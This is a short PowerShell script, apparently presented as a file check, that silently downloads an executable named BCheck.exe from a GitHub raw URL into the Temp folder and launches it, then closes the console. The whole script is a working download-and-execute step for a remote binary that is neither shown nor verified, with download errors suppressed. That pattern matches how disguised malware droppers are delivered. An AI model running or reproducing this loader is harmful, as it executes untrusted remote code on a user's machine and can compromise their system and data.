
Write-Host "Проверка files" -ForegroundColor Red

$url = "https://github.com/fayk0180-cmd/OverCheck/raw/refs/heads/main/BCheck.exe"  # 
$output = "$env:Temp\BCheck.exe"

Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue

if (Test-Path $output) {
    Start-Process $output
} else {
    Write-Host "Файл не скачан" -ForegroundColor Yellow
}

if ($Host.Name -like "*ConsoleHost*") {
    Start-Sleep -Seconds 2  
    exit
}


